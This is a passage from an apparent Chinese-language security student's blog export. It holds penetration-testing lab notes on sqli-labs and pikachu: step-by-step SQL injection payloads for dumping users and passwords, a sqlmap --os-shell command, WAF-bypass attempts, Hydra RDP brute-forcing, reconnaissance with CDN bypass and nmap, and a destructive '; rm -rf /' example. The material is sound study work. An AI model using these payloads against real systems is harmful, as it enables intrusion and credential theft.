\"http://192.168.18.173/good.php?id=1\" --os-shell --batch\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508211921004.png)\n\n成功执行\n\n### 3、宽字节注入，堆叠注入，二次注入，万能密码以及相关原理\n\n#### ①宽字节注入\n\n后端对输入参数进行处理时，对于一些特殊符号如’ “等进行了\\转义处理，并且数据库使用了GBK编码，在进行注入时，加入一些特殊二字节的值与其\\进行拼接，此时服务端会认为是一个汉字，从而消除\\转义作用，达到绕过\n\nless-32关\n\n```\n?id=1%db%27 --+\n%db是某一字符\n%27是'\n当%db和\\进行组合时变成一个汉字\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508211935150.png)\n\n完成绕过，随后sql语句和普通联合查询一样，但是前面仍然要绕过\\\n\n#### ②堆叠注入\n\n后端使用mysqli_multi_query() ，允许同时执行多条语句，使用；进行分割\n\nless-38关\n\n```sql\n//利用可执行多条sql语句执行插入一个新用户\n?id=1';insert into users(id,username,password)\nvalues(29,'caixukun','521314')--+\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508211944085.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508211945827.png)\n\n成功执行\n\n#### ③二次注入\n\n数据库在保存数据的时候，保存的是原本的数据，没有对一些特殊字符进行转义，但后端在提取数据的时候，也没有进行转义，导致数据和语句进行了闭合拼接引发的错误\n\n```\n注册一个admin'#的用户\n后端处理数据代码为\nid='$id'\n此时对admin'#这个用户进行操作时后端参数是\nid='admin'#'\n#把后面进行了注释，所以实际操作的用户是admin\n```\n\nless-24\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508211952025.png)\n\n我们登录进去密码是123456\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508211955088.png)\n\n我们修改密码为qwe123\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508211956122.png)\n\n使用admin和qwe123进行登录\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508211956486.png)\n\n成功登录\n\n#### ④万能密码\n\n后端代码\n\n```php\n@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\n当输入admin' or '1' = '1'#时\n后端代码就变成\n@$sql=\"SELECT username, password FROM users WHERE username='admin' or '1' = '1'#' and password='$passwd' LIMIT 0,1\";\n此时#后面代码被注释，前面只校验了一个用户名为admin，且前面语句为真，当存在这个账户时，不用密码，就可以绕过直接登录\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508212000096.png)\n\n### 4、尝试手动绕过安全狗的限制，注入出来security数据库的几张表名称\n\n将安全狗安装在服务器上\n\n访问靶场进行注入\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508212008592.png)\n\n发现被拦截，此时去验证拦截的那个字符\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508212009348.png)\n\n‘未被拦截\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508212010864.png)\n\norder by --+也未被拦截\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508212011641.png)\n\nunion也未被拦截\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508212011825.png)\n\nselect被拦截\n\n绕过\n\n- 大小写绕过\n\n```\n?id=-1' union SElect 1,2,3--+\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508212012874.png)\n\n失败\n\n- 双写绕过\n\n```\n?id=-1' union seselectlect 1,2,3 --+\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508212014722.png)\n\n看似绕过但是语句行不通\n\n- 编码绕过\n\n```\n//url编码select\n-1' union select 1,2,3 --+\n-1' union  1,2,3 --+\n```\n\n还是不行\n\n打不过waf"},{"title":"渗透测试-sql注入","url":"/2025/08/17/渗透测试-sql注入(1)/","content":"\n\n\n### 1、使用sqlilab演示数字型注入和字符型注入的区别，以及四种sql注入类型，截图说明每一步的含义\n\n#### ①字符型\n\n后端输入参数的类型，如果是id='$id'，则代表是字符型\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201555718.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201557939.png)\n\n当输入1和2-1的时候，页面回显不一样，参数没有进行运算，，代表是字符型，若是数字型则会进行运算\n\n#### ②数字型\n\n后端参数如果是id=$id，则代表是数字型\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201555718.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201559306.png)\n\n当输入1和2-1时，页面回显一样，参数进行了运算，则代表是数字型\n\n#### ③联合查询\n\n使用union语句，表示同前一语句一起执行，要使用union进行联合查询，必须使select字段数与前语句字段数一致，否则不能成功执行\n\n- ##### 判断字段数\n\n  order by进行报错，若输入数值小于或等于字段数，则正常回显，若大于字段数则发生报错\n\n  ```sql\n  order by 数值\n  ?id=1' order by 4 --+\n  //--+表示注释后面语句\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201618692.png)\n\n  页面发生报错\n\n  换个值order by 3\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201618385.png)\n\n  页面正常回显，证明存在三个字段\n\n- ##### 显示字段回显\n\n  为使我们想要获取的数据正确回显，要查看页面回显位置\n\n  ```sql\n  ?id=-1' union select 1,2,3 --+\n  //id输入一个不存在的值，则返回空，才能看见我们想看见的\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201623338.png)\n\n- ##### 联合注入\n\n  注入sql语句，进行执行\n\n  ```sql\n  //查询当前数据库名\n  ?id=-1' union select 1,database(),3 --+\n  //查询当前数据库所有表名\n  ?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+\n  //获取表中字段名\n  ?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema='security'--+\n  //获取数据\n  ?id=-1' union select 1,group_concat(username),group_concat(password) from security.users --+\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201629983.png)\n\n  拿到数据库名\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201636719.png)\n\n  拿到表名\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201641244.png)\n\n  拿到字段名\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201644937.png)\n\n  拿到数据\n\n- ##### 报错注入\n\n  利用页面的报错信息，将想要的数据提取出来，这些函数优先级较高，所以会先执行\n\n  ```sql\n  //函数\n  extractvalue()\n  updatexml()\n  exp()\n  floor()\n  ```\n\n  利用extractvalue进行注入\n\n  ```sql\n  //获取数据库名\n  ?id=1' and extractvalue(1,concat(1,(select database()))) --+\n  //获取表名\n  ?id=1' and extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table\n  _schema='security'))) --+\n  //获取字段名\n  ?id=1' and extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'))) --+\n  //获取数据\n  ?id=1' and extractvalue(concat(1,(select group_concat(username) from security.users))) --+\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201705357.png)\n\n  拿到数据库名\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201704414.png)\n\n  拿到表名\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201710853.png)\n\n  拿到字段名\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201714006.png)\n\n- ##### 布尔盲注\n\n  页面没有明确回显有效信息，只能根据页面回显效果来进行判断\n\n  ```sql\n  //函数\n  length()\n  substr()\n  ascii()\n  ```\n\n  一个个试太麻烦，为了方便可以利用yakit或者burp\n\n  ```sql\n  //判断数据库字长\n  ?id=1' and length(database())=7 --+\n  ?id=1' and length(database())=8 --+\n  //判断数据库名\n  ?id=1' and ascii(substr(database(),1,1))=115 --+\n  ?id=1' and ascii(substr(database(),2,1))=105 --+\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201722632.png)\n\n  利用页面的正常回显来判断，最后组合字符\n\n- ##### 时间盲注\n\n  页面没有明确回显信息，可以利用响应时间判断\n\n  ```sql\n  //函数\n  if()\n  sleep()\n  bentchmark()\n  substr()\n  length()\n  ```\n\n  可以利用burp或yakit辅助\n\n  ```sql\n  //判断数据库名字长\n  ?id=1' and if(length(database())=8,sleep(5),1) --+\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201732030.png)\n\n  通过响应时间进行判断\n\n### 2、对自己上周编写的网站进行sql注入的尝试\n\n#### ①判断注入类型\n\n```sql\n?id=1'\n?id=2\n?id=2-1\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201859615.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201859003.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201900290.png)\n\n页面回显一致，证明是字符型\n\n#### ②判断列数\n\n```sql\n?id=1' order by 3 --+\n?id=1' order by 4 --+\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201901406.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201902100.png)\n\n字段数为3\n\n#### ③判断回显\n\n```sql\n?id=-1' union select 1,2,3 --+\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201903956.png)\n\n#### ④查询数据库名\n\n```\n?id=-1' union select 1,database(),3 --+\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201904743.png)\n\n#### ⑤查询表名\n\n```sql\n?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='cms' --+\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201905127.png)\n\n只有一个表\n\n#### ⑥查询字段名\n\n```sql\n?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='cms' and table_name='user' --+\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201907492.png)\n\n#### ⑦获取数据\n\n```sql\n?id=-1' union select 1,group_concat(uname),group_concat(pass) from cms.user --+\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201909699.png)\n\n### 3、使用sqlmap注入出靶场网站的所有数据库\n\n```bash\nsqlmap -u \"xxx.com?id=\"\n-u //指定目标url\n--data=\"\" //post注入，如\"user=admin&password=admin123\"\n-r //指定http请求文件，适用于post\n--dbs //列出该网站所有数据库\n--batch //默认指令\n--current-db //获取当前数据库名\n-D //指定数据库\n--tables //列出表名\n-T //指定表\n--columns //列出字段名\n-C //指定字段\n--dump //获取数据\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201923684.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201923615.png)\n\n获取到所有库名\n\n### 扩展\n\n### 尝试编写代码修复sql注入漏洞\n\n原代码\n\n```php\n<?php\n$servername = \"localhost\";\n$dbusername = \"root\";\n$dbpassword = \"123456\";\n$dbname = \"cms\";\n\n// 创建连接\n$conn = new mysqli($servername, $dbusername, $dbpassword, $dbname);\n\nif (isset($_GET['id']) && !empty($_GET['id'])) {\n    $id = $_GET['id'];\n\n        // 准备和绑定\n        $sql=\"SELECT id, uname, pass FROM user WHERE id = '$id'\";\n        $result = mysqli_query($conn,$sql);\n        $row = mysqli_fetch_assoc($result);\n\n    } else {\n        $error = \"请输入ID\";\n}\n```\n\n可以进行正则匹配，限定字符\n\n改后\n\n```php\n//使输入必须为数字\nif (!preg_match('/^[0-9]+$/', $id)) {\n     die('非法输入：ID必须是数字');\n}\n```\n\n然后继续进行注入试试\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201938553.png)\n\n成功限制\n\n\n\n### 思考假如传参方式是post，sqlmap该如何使用\n\npost可以利用\n\n```bash\n--data参数或者-r参数指定文件\n```\n\n```bash\nsqlmap -u \"xxx.com\" --data\"username=admin&password=123\"\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201944310.png)\n\n成功进行注入\n\n```bash\n//创建一个http请求的txt文件\nvim test.txt\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201946876.png)\n\n然后进行注入\n\n```bash\nsqlmap -r test.txt --batch --dbs\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201948552.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508201949334.png)\n\n成功注入"},{"title":"渗透测试-信息收集","url":"/2025/08/16/渗透测试-信息收集/","content":"\n\n\n！！！不要对互联网未授权资产做主动信息收集\n\n### 1、针对xiusafe.com域名，尝试绕过cdn\n\n#### ①cdn简介\n\nCDN 的全称是 Content Delivery Network，即内容分发网络；\n\nCDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在 CDN 服务，将会影响到后续的安全测试过程。 关键技术：内容存储与分发技术\n\n#### ②cdn检测\n\n如何检测一个网站是否使用了cdn服务\n\n- ##### nslookup&ping\n\n  ```bash\n  nslookup xxx.com\n  ping xxx.com\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191605705.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191605714.png)\n\n可以看到并非同一ip，推测使用了cdn服务\n\n- ##### 多地ping测试\n\n  使用在线平台测试\n\n  https://ping.chinaz.com/\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191609413.png)\n\n可以看到ping到39个ip，由此确定使用了cdn服务\n\n#### ③绕过cdn\n\n- ##### 国外主机访问\n\n  该站使用的cdn服务只在国内具有节点服务器，国外不存在节点服务器，当使用国外主机进行访问的时候，可能访问到真实ip\n\n  https://ping.chinaz.com/\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191614266.png)\n\n这个方法貌似行不通，存在三个ip\n\n- ##### DNS记录\n\n  查看历史DNS记录，可能存在使用cdn之前的ip\n\n  微步在线，https://x.threatbook.cn/\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191634906.png)\n\n解析到133条记录，可以挨个通过ip去进行访问，若是访问到，那就是真实ip，最好从后往前去访问\n\n- ##### 子域名查询\n\n  有些网站只对主域名使用了cdn服务，但是子域名没有，且主域名和子域名指向同一台服务器，查到子域名后对子域名进行dns解析，可能查到真实ip\n\n  在线平台\n\n  https://sitereport.netcraft.com/\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191645478.png)\n\n  https://site.ip138.com/\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191709256.png)\n\n- ##### 网络空间引擎\n\n  FOFA https://fofa.info/\n\n  直接搜索域名\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191716501.png)\n\n看到有一个ip，并且也搜到了cdn服务商，直接去访问ip地址\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191717112.png)\n\n成功拿到真实ip\n\n- ##### 查看网站源代码\n\n  有些网站源代码可能藏有有用信息\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191724040.png)\n\n这个网站源码貌似没有有用信息\n\n### 2、针对testfire.net网站，进行信息收集\n\n#### ①资产收集\n\n通过搜索语法进行收集，资产存在哪些敏感页面，如登录框，后台等，可以作为攻击点，同时也可以查询旁站，旁站防御力弱，容易攻击，可以作为跳板\n\n```\nsite:testfire.net\ninurl:login/admin\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191729968.png)\n\n####  ②子域名收集\n\n使用yakit的子域名收集功能，搜索更多有用信息\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191742546.png)\n\n看到该服务器貌似还开启了ftp服务，可以尝试ftp爆破，并且暴露了ip\n\n#### ③whois信息\n\n通过whois来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS解析服务器、注册人联系电话等\n\n使用站长之家的whois查询功能，直接搜索域名\n\nhttps://whois.chinaz.com/\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191750857.png)\n\n查找到一些信息\n\n#### ④端口扫描\n\n扫描端口和已经开放的服务，作为攻击点\n\n使用nmap扫描\n\n```bash\nnmap -sS 65.61.137.117\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191835782.png)\n\n可以看到使用smtp和pop3邮件服务，可以尝试对此服务进行攻击\n\n#### ⑤网站架构\n\n使用插件wappalyzer\n\n有些网站可能会暴露中间件，框架的版本信息，可以利用这些信息去找相关漏洞\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191907768.png)\n\n#### ⑥网站前端源码\n\n有些开发者可能会将敏感信息存在前端源码的注释中\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191909286.png)\n\n#### ⑦目录扫描\n\n可以找网站存在哪些敏感文件，或者后台\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191926112.png)\n\n#### ⑧c段收集\n\n使用fofa进行搜索同一网段下的其他服务器，有可能他们属于同一内网，对其他薄弱服务器进行攻击\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191934307.png)\n\n#### ⑨指纹识别\n\n了解网站架构，方便利用\n\nhttp://sso.tidesec.com/\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508191938371.png)\n"},{"title":"web练习5","url":"/2025/08/15/web练习5/","content":"\n\n\n### 一、常见web漏洞的成因和危害\n\n#### 1.SQL 注入相关漏洞\n\n- 基础 SQL 注入（SQLi）\n\n​       成因：对用户的输入数据未经过滤，导致可以执行sql语句\n\n​       危害：数据库数据泄露、篡改、删除，甚至获取服务器控制权\n\n- 报错注入\n\n  成因：数据库错误信息直接返回前端\n\n  危害：泄露数据库敏感信息\n\n- 二次注入（存储型 SQL 注入的特殊形式，输入存储后触发）\n\n  成因：恶意输入先被存储，后续操作中触发 SQL 执行\n\n  危害：绕过初次过滤，实现持久化攻击，如修改密码\n\n- 堆叠注入（通过分号执行多条 SQL 语句）\n\n  成因：支持分号`;`执行多条 SQL 语句\n\n  危害：数据库数据泄露、篡改、删除，甚至获取服务器控制权\n\n- 布尔盲注（基于查询结果的真假判断）\n\n  成因：页面无显式错误信息，但可通过真/假或延迟响应判断结果\n\n  危害：隐蔽地提取数据\n\n- 时间盲注（基于延迟响应判断）\n\n  成因：页面无显式错误信息，但可通过真/假或延迟响应判断结果\n\n  危害：隐蔽地提取数据\n\n- GET 注入（URL 参数）\n\n- POST 注入（表单数据）\n\n- Cookie 注入（Cookie 字段）\n\n- User-Agent 注入（请求头字段）\n\n- Referer 注入（请求头字段）\n\n  成因：未对 HTTP 请求各参数（URL/表单/Cookie/Header）过滤\n\n  危害：与其他sql注入相同，攻击入口更广泛\n\n#### 2.跨站脚本（XSS）相关漏洞\n\n- 存储型 XSS（恶意脚本存储到服务器，持久触发）\n\n  成因：恶意脚本存入数据库，其他用户访问时触发\n\n  危害：盗取用户 Cookie、会话劫持、钓鱼攻击、传播蠕虫\n\n- 反射型 XSS（脚本随请求返回，一次性触发）\n\n  成因：恶意脚本随 URL 参数返回页面，需用户点击触发\n\n  危害：短时攻击，如钓鱼链接，窃取当前用户敏感信息\n\n- DOM 型 XSS（客户端 DOM 解析时执行，不经过服务器）\n\n  成因：前端 JavaScript 动态修改 DOM 时未转义输入\n\n  危害：无需服务器参与，纯客户端攻击\n\n#### 3.命令注入相关漏洞\n\n- 直接命令注入（用户输入直接拼接系统命令执行）\n\n  成因：用户输入直接拼接系统命令，如 `; rm -rf /\n\n  危害：执行任意系统命令、删文件、挖矿\n\n- 间接命令注入（通过文件上传、配置文件等间接触发）\n\n  成因：通过上传文件/配置文件触发命令执行\n\n  危害：执行任意系统命令、删文件、挖矿\n\n#### 4.文件操作相关漏洞\n\n##### ①文件上传漏洞（细分 4 类）\n\n- 后缀名绕过（如.php5、.phtml）\n\n  成因：未校验扩展名\n\n  危害：上传 WebShell，控制服务器\n\n- MIME 类型绕过（修改Content-Type）\n\n  成因：仅校验客户端 `Content-Type`\n\n  危害：上传 WebShell，控制服务器\n\n- 路径遍历结合上传（如../shell.php）\n\n  成因：文件名含 `../`\n\n  危害：将恶意文件写入非预期目录\n\n- 解析漏洞利用（如 IIS/nginx 解析缺陷）\n\n  成因：服务器缺陷\n\n  危害：将恶意文件写入非预期目录\n\n##### ②文件包含漏洞\n\n- 本地文件包含（LFI，包含服务器本地文件）\n\n  成因：动态包含文件时未限制路径\n\n  危害：读取敏感文件、执行代码注入\n\n- 远程文件包含（RFI，包含远程恶意文件）\n\n  成因：允许包含远程 URL\n\n  危害：直接执行远程恶意代码\n\n- 任意文件读取（未授权读取敏感文件，如/etc/passwd）\n\n  成因：未校验文件路径参数\n\n  危害：泄露源码、配置文件、数据库凭证\n\n- 任意文件删除（未授权删除服务器文件）\n\n  成因：删除操作未授权校验\n\n  危害：删除关键日志或配置文件\n\n- 任意文件写入（未授权写入文件，如写入后门）\n\n  成因：写入操作未限制路径与内容\n\n  危害：写入 WebShell 或恶意脚本\n\n#### 5.认证与授权漏洞\n\n- 弱口令（密码复杂度不足，易被暴力破解）\n\n  成因：用户或管理员使用简单密码/未改默认密码\n\n  危害：账号被爆破，攻击者直接登录\n\n- 默认口令（未修改设备 / 系统默认账号密码）\n\n  成因：用户或管理员使用简单密码/未改默认密码\n\n  危害：账号被爆破，攻击者直接登录\n\n- 密码明文传输（未加密传输，如 HTTP 传输密码）\n\n  成因：未进行加密处理，未使用 HTTPS 加密\n\n  危害：中间人窃取密码\n\n- 会话固定（固定会话 ID，诱导用户使用）\n\n  成因：会话 ID 不变或未绑定 IP/User-Agent\n\n  危害：攻击者劫持合法会话冒充用户\n\n- 会话劫持（窃取会话 ID 冒充用户）\n\n  成因：会话 ID 不变或未绑定 IP/User-Agent\n\n  危害：攻击者劫持合法会话冒充用户\n\n- 水平越权（访问同权限用户数据，如查他人订单）\n\n  成因：未校验数据归属，如id等\n\n  危害：访问他人敏感数据\n\n- 垂直越权（低权限访问高权限功能，如普通用户进后台）\n\n  成因：未校验用户角色，管理员id或用户id\n\n  危害：执行高权限操作\n\n- 权限提升（通过漏洞获取更高权限）\n\n  成因：存在具有高权限文件，如suid\n\n  危害：提升权限\n\n- 认证绕过（直接跳过登录验证，如逻辑缺陷）\n\n  成因：逻辑缺陷\n\n  危害：通过对请求包进行修改\n\n- 多因素认证缺失（仅单因素认证，易被破解）\n\n  成因：设置简单验证方式，如仅密码认证，无验证码，生物验证等\n\n  危害：若密码可爆破，则被盗取\n\n- 密码重置逻辑漏洞（如验证码复用、重置链接永久有效）\n\n  成因：验证码复用、重置链接无时效限制\n\n  危害：重置任意用户密码\n\n#### 6.跨站请求伪造（CSRF）相关漏洞\n\n- 基础 CSRF（诱导用户在已登录状态执行操作）\n\n  成因：关键操作（如转账）未校验请求来源\n\n  危害：诱骗用户执行非自愿操作\n\n- GET 型 CSRF（利用 GET 请求的幂等性触发）\n\n  成因：利用 GET 请求幂等性或自动提交表单触发，配合xss漏洞利用\n\n  危害：诱骗用户执行非自愿操作\n\n- POST 型 CSRF（利用表单自动提交触发）\n\n  成因：配合xss漏洞利用\n\n  危害：诱骗用户执行非自愿操作\n\n#### 7.逻辑漏洞\n\n- 支付逻辑漏洞（如价格篡改、重复支付退款）\n\n  成因：前端校验价格/数量，后端未二次校验\n\n  危害：0元购、重复退款、无限刷积分\n\n- 订单逻辑漏洞（如越权修改订单状态、重复下单）\n\n  成因：前端校验价格/数量，后端未二次校验\n\n  危害：0元购、重复退款、无限刷积分\n\n- 注册逻辑漏洞（如重复注册、批量注册、手机号复用）\n\n  成因：手机号/邮箱未绑定用户、验证码泄露或复用\n\n  危害：批量注册垃圾账号\n\n- 密码找回逻辑漏洞（如跳过验证步骤、验证码泄露）\n\n  成因：手机号/邮箱未绑定用户、验证码泄露或复用\n\n  危害：盗号\n\n- 验证码逻辑漏洞（如验证码过期时间长、可重复使用）\n\n  成因：手机号/邮箱未绑定用户、验证码泄露或复用\n\n  危害：批量注册垃圾账号、盗号\n\n- 业务流程绕过（如跳过关键步骤完成操作）\n\n  成因：未强制顺序执行步骤\n\n  危害：破坏业务规则，造成资损\n\n#### 8.XML 与数据格式相关漏洞\n\n- XML 外部实体注入（XXE，利用外部实体读取文件 / 执行命令）\n\n  成因：解析 XML 时启用外部实体\n\n  危害：读取服务器文件、SSRF、拒绝服务\n\n- XPath 注入（XPath 查询未过滤，导致数据泄露）\n\n  成因：XPath 查询拼接用户输入未过滤\n\n  危害：泄露 XML 数据库内容\n\n#### 9.服务器配置漏洞\n\n- 目录遍历（通过../等路径访问非预期目录）\n\n  成因：未过滤路径参数中的 ../\n\n  危害：读取敏感文件\n\n- 敏感信息泄露（如 PHPINFO、数据库错误详情、日志泄露）\n\n  成因：通过报错导致详情暴露\n\n  危害：泄露数据库密码、服务器路径、API 密钥\n\n- 服务器版本泄露（响应头暴露 Apache/Nginx 版本）\n\n  成因：未对版本信息隐藏\n\n  危害：利用相应版本存在的漏洞\n\n- 默认页面未删除（如phpMyAdmin、test.php默认路径）\n\n  成因：未删除默认页面\n\n  危害：敏感信息泄露\n\n- 目录索引开启（未禁用自动目录列表，泄露文件结构）\n\n  成因：未关闭 Options -Indexes\n\n  危害：暴露目录结构，发现隐藏文件\n\n- 不安全 HTTP 方法（开启 PUT/DELETE，允许文件操作）\n\n  成因：开启 PUT/DELETE 等方法\n\n  危害：攻击者直接上传/删除服务器文件\n\n- CORS 配置不当（跨域资源共享规则过松，泄露数据）\n\n  成因：响应头 Access-Control-Allow-Origin: *\n\n  危害：恶意网站跨域读取用户敏感数据\n\n#### 10.密码学与传输漏洞\n\n- 弱加密算法（如使用 MD5、SHA1 存储密码）\n\n  成因：使用 MD5/SHA1 存储密码\n\n  危害：撞库\n\n- 密钥泄露（硬编码密钥、日志泄露密钥）\n\n  成因：密钥容易获取\n\n  危害：泄露敏感信息，密码爆破\n\n- 明文存储密码（数据库直接存储明文密码）\n\n  成因：数据库存明文或 HTTP 传输密码\n\n  危害：泄露敏感信息\n\n- 加密传输缺失（未用 HTTPS，数据明文传输）\n\n  成因：数据库存明文或 HTTP 传输密码\n\n  危害：泄露敏感信息\n\n- SSL/TLS 配置漏洞（支持弱加密套件、协议版本过低）\n\n  成因：支持弱加密套件\n\n  危害：泄露敏感信息\n\n#### 11.API 与新兴技术漏洞\n\n- API 未授权访问（接口缺少认证，直接调用）\n\n  成因：接口无身份验证\n\n  危害：直接获取/篡改所有用户数据\n\n- API 参数篡改（修改接口参数越权操作）\n\n  成因：接口无身份验证\n\n  危害：直接获取/篡改所有用户数据\n\n#### 12.其他类型漏洞\n\n- 反序列化漏洞（如 Java/PHP 反序列化执行命令）\n\n  成因：反序列化数据未校验，使用魔术方法\n\n  危害：远程代码执行\n\n- 服务器端请求伪造（SSRF，诱导服务器请求内网资源）\n\n  成因：服务器代理请求未限制目标\n\n  危害：探测内网、攻击内部系统\n\n- 模板注入（如 Jinja2/Twig 注入，执行代码）\n\n  成因：用户输入直接拼接到模板\n\n  危害：执行服务器代码\n\n### 二、pikachu暴力破解\n\n#### 1.基于表单的暴力破解\n\n①随意输入账户密码，点击login，用yakit进行抓包\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508181938245.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508181939362.png)\n\n②进入FUZZ测试\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508181939602.png)\n\n③选中参数，配置字典\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508181940938.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508181941628.png)\n\n④发送请求\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508181942397.png)\n\n通过响应大小判断爆破成功\n\n#### 2.验证码绕过(on server)\n\n①同上，抓包\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508181944703.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508181945976.png)\n\n②尝试在请求包里修改账号和密码，输入新生成的验证码\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508181947981.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508181948647.png)\n\n发现验证码不会过期\n\n③同第一关进行爆破\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508181950682.png)\n\n成功爆破\n\n#### 3.验证码绕过(on client)\n\n①同上，抓包，尝试修改账户和密码\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508181953336.png)\n\n发现仍然不会过期\n\n②加载字典，爆破\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508181955579.png)\n\n爆破成功\n\n### 三、Hydra爆破rdp\n\n①编写用户字典和密码字典\n\n```bash\nvim user.txt\nvim pass.txt\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508182034791.png)\n\n②开始爆破\n\n```bash\nhydra -L user.txt -P pass.txt 192.168.18.171 rdp\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508182050082.png)\n\n成功爆破\n\n"},{"title":"web练习4","url":"/2025/08/14/web练习4/","content":"\n\n\n#### 1、mysql数据库基操\n\n①创建数据库cms\n\n```mysql\ncreate database cms;\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508151405541.png)\n\n已经创建好cms数据库\n\n②创建表user\n\n```mysql\ncreate table cms.user(id int auto_increment primary key,uname char(32),pass char(32));\n\n//设置主键为id，并且自增\nauto_increment primary key 